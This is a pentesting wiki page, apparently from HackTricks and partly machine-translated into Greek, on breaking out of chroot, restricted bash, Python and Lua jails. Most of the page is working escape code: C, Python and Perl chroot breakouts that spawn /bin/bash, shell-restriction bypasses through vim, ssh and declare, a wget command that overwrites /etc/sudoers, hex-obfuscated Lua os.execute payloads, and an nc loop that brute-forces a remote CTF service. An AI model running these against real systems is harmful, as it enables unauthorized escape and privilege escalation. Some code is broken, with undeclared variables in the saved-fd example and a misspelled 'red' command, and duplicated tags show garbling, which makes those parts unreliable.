# Escaping from Jails

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**

## Chroot Escapes

From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
Usually this means that to escape you need to be root inside the chroot.

{% hint style="success" %}
The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.

This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.
{% endhint %}

Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>  
<summary>Πυθών</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
Αυτό είναι παρόμοιο με την προηγούμενη περίπτωση, αλλά σε αυτή την περίπτωση ο **επιτιθέμενος αποθηκεύει έναν περιγραφέα αρχείου στον τρέχοντα φάκελο** και στη συνέχεια **δημιουργεί το chroot σε έναν νέο φάκελο**. Τελικά, καθώς έχει **πρόσβαση** σε αυτόν τον **FD** **έξω** από το chroot, έχει πρόσβαση σε αυτόν και **διαφεύγει**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD μπορεί να περαστεί μέσω Unix Domain Sockets, οπότε:

* Δημιουργήστε μια διαδικασία παιδί (fork)
* Δημιουργήστε UDS ώστε ο γονέας και το παιδί να μπορούν να μιλούν
* Εκτελέστε chroot στη διαδικασία παιδιού σε έναν διαφορετικό φάκελο
* Στη διαδικασία γονέα, δημιουργήστε ένα FD ενός φακέλου που είναι εκτός του νέου chroot της διαδικασίας παιδιού
* Περάστε στη διαδικασία παιδιού αυτό το FD χρησιμοποιώντας το UDS
* Η διαδικασία παιδιού chdir σε αυτό το FD, και επειδή είναι εκτός του chroot της, θα ξεφύγει από τη φυλακή
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Τοποθέτηση της ρίζας συσκευής (/) σε έναν φάκελο μέσα στο chroot
* Chrooting σε αυτόν τον φάκελο

Αυτό είναι δυνατό στο Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Τοποθέτηση του procfs σε έναν φάκελο μέσα στο chroot (αν δεν είναι ήδη)
* Αναζητήστε ένα pid που έχει διαφορετική είσοδο root/cwd, όπως: /proc/1/root
* Chroot σε αυτήν την είσοδο
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Δημιουργήστε ένα Fork (παιδική διαδικασία) και chroot σε έναν διαφορετικό φάκελο πιο βαθιά στο FS και CD σε αυτόν
* Από τη διαδικασία γονέα, μετακινήστε τον φάκελο όπου βρίσκεται η διαδικασία παιδί σε έναν φάκελο προηγούμενο από το chroot των παιδιών
* Αυτή η διαδικασία παιδί θα βρει τον εαυτό της εκτός του chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Πριν από καιρό, οι χρήστες μπορούσαν να αποσφαλματώσουν τις δικές τους διαδικασίες από μια διαδικασία του εαυτού τους... αλλά αυτό δεν είναι πλέον δυνατό από προεπιλογή
* Ούτως ή άλλως, αν είναι δυνατόν, μπορείτε να ptrace σε μια διαδικασία και να εκτελέσετε ένα shellcode μέσα σε αυτήν ([δείτε αυτό το παράδειγμα](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

Πάρτε πληροφορίες σχετικά με τη φυλακή:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modify PATH

Ελέγξτε αν μπορείτε να τροποποιήσετε τη μεταβλητή περιβάλλοντος PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Χρησιμοποιώντας το vim
```bash
:set shell=/bin/sh
:shell
```
### Δημιουργία σεναρίου

Ελέγξτε αν μπορείτε να δημιουργήσετε ένα εκτελέσιμο αρχείο με _/bin/bash_ ως περιεχόμενο
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Get bash from SSH

Αν έχετε πρόσβαση μέσω ssh, μπορείτε να χρησιμοποιήσετε αυτό το κόλπο για να εκτελέσετε ένα bash shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Δηλώστε
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Μπορείτε να αντικαταστήσετε, για παράδειγμα, το αρχείο sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Άλλες τεχνικές

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Θα μπορούσε επίσης να είναι ενδιαφέρουσα η σελίδα:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Jails

Τεχνικές για να ξεφύγετε από python jails στη παρακάτω σελίδα:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

Σε αυτή τη σελίδα μπορείτε να βρείτε τις παγκόσμιες συναρτήσεις στις οποίες έχετε πρόσβαση μέσα στο lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval με εκτέλεση εντολών:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Ορισμένα κόλπα για **να καλέσετε συναρτήσεις μιας βιβλιοθήκης χωρίς να χρησιμοποιήσετε τελείες**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Καταγράψτε τις λειτουργίες μιας βιβλιοθήκης:
```bash
for k,v in pairs(string) do print(k,v) end
```
Σημειώστε ότι κάθε φορά που εκτελείτε την προηγούμενη μία γραμμή σε **διαφορετικό περιβάλλον lua η σειρά των συναρτήσεων αλλάζει**. Επομένως, αν χρειάζεται να εκτελέσετε μια συγκεκριμένη συνάρτηση, μπορείτε να εκτελέσετε μια επίθεση brute force φορτώνοντας διαφορετικά περιβάλλοντα lua και καλώντας την πρώτη συνάρτηση της βιβλιοθήκης le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Αποκτήστε διαδραστικό lua shell**: Εάν βρίσκεστε μέσα σε ένα περιορισμένο lua shell, μπορείτε να αποκτήσετε ένα νέο lua shell (και ελπίζουμε απεριόριστο) καλώντας:
```bash
debug.debug()
```
## Αναφορές

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Διαφάνειες: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
